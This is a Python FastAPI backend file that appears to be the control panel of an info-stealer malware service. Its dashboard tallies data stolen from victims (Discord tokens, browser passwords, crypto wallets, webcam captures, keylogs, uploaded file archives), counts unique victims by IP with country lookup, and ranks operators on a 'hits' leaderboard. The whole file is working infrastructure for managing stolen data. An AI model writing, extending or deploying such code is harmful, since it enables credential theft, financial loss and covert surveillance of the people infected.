from typing import Any
from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from sqlalchemy import func
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
from datetime import datetime, timedelta
import json

router = APIRouter()


def get_country_from_ip(ip: str) -> str:
    """Get country code from IP address"""
    try:
        import requests
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=2)
        if resp.status_code == 200:
            return resp.json().get("countryCode", "Unknown")
    except:
        pass
    return "Unknown"


def serialize_dashboard_log(log: Log) -> dict:
    """Serialize a log for dashboard display with proper fallbacks"""
    # Parse content JSON
    data = {}
    if log.content:
        try:
            data = json.loads(log.content)
        except:
            data = {"raw": log.content}
    
    # Get pc_user from log or from data
    pc_user = log.pc_user or data.get('pc_user') or data.get('player') or 'Unknown'
    pc_name = log.pc_name or data.get('pc_name') or 'Unknown'
    ip = log.ip_address or data.get('ip') or 'Unknown'
    
    # Get country - try from data first, then lookup
    country = data.get('country') or 'Unknown'
    
    return {
        "id": log.id,
        "user_id": log.user_id,
        "log_type": log.log_type,
        "content": log.content,
        "data": data,  # Parsed JSON for preview
        "ip": ip,
        "ip_address": ip,  # Alias for compatibility
        "pc_name": pc_name,
        "pc_user": pc_user,
        "country": country,
        "created_at": log.created_at.isoformat() if log.created_at else None
    }

@router.get("/")
def get_dashboard(
    limit: int = 50,
    skip: int = 0,
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    # Filter by user unless admin
    query = db.query(Log)
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    # Get today's date
    today = datetime.utcnow().date()
    today_start = datetime.combine(today, datetime.min.time())
    
    # Count by type - always filter by user
    def count_type(log_type):
        q = db.query(Log).filter(Log.log_type == log_type)
        if not current_user.is_admin:
            q = q.filter(Log.user_id == current_user.id)
        return q.count()
    
    def count_today(log_type=None):
        q = db.query(Log).filter(Log.created_at >= today_start)
        if log_type:
            q = q.filter(Log.log_type == log_type)
        if not current_user.is_admin:
            q = q.filter(Log.user_id == current_user.id)
        return q.count()
    
    # Get unique victims (by IP address - more accurate than pc_name)
    victims_query = db.query(func.count(func.distinct(Log.ip_address)))
    if not current_user.is_admin:
        victims_query = victims_query.filter(Log.user_id == current_user.id)
    victims = victims_query.scalar() or 0
    
    stats = {
        "hits_today": count_today(),
        "mc_sessions": count_type("discord_embed") + count_type("system") + count_type("minecraft") + count_type("guardian"),
        "tokens": count_type("discord"),
        "passwords": count_type("browser"),
        "wallets": count_type("wallet"),
        "zips": count_type("zip_upload"),
        "victims": victims,
        "webcam": count_type("webcam"),
        "keylog": count_type("keylog"),
        # Today counts for comparison
        "tokens_today": count_today("discord"),
        "passwords_today": count_today("browser"),
        "wallets_today": count_today("wallet"),
        "zips_today": count_today("zip_upload"),
        "webcam_today": count_today("webcam"),
    }
    
    # Get recent logs
    logs = query.order_by(Log.created_at.desc()).offset(skip).limit(limit).all()
    logs_serialized = [serialize_dashboard_log(log) for log in logs]
    
    return {"success": True, "stats": stats, "logs": logs_serialized}

@router.get("/leaderboard")
def get_leaderboard(
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    # Get top 10 users by hit count in last 30 days
    last_30_days = datetime.utcnow() - timedelta(days=30)
    
    # Query: Count logs per user, join with user to get leaderboard_name
    # Filter logs >= last_30_days
    # Group by User
    # Order by Count desc
    
    results = db.query(
        User.username,
        User.leaderboard_name,
        func.count(Log.id).label('hits')
    ).join(Log, User.id == Log.user_id)\
     .filter(Log.created_at >= last_30_days)\
     .filter(User.is_admin == False)\
     .group_by(User.id)\
     .order_by(func.count(Log.id).desc())\
     .limit(10).all()
    
    leaderboard = []
    for rank, (username, lb_name, hits) in enumerate(results, 1):
        display_name = lb_name if lb_name else "Anonymous"
        leaderboard.append({
            "rank": rank,
            "name": display_name,
            "hits": hits
        })
        
    return {"success": True, "leaderboard": leaderboard}
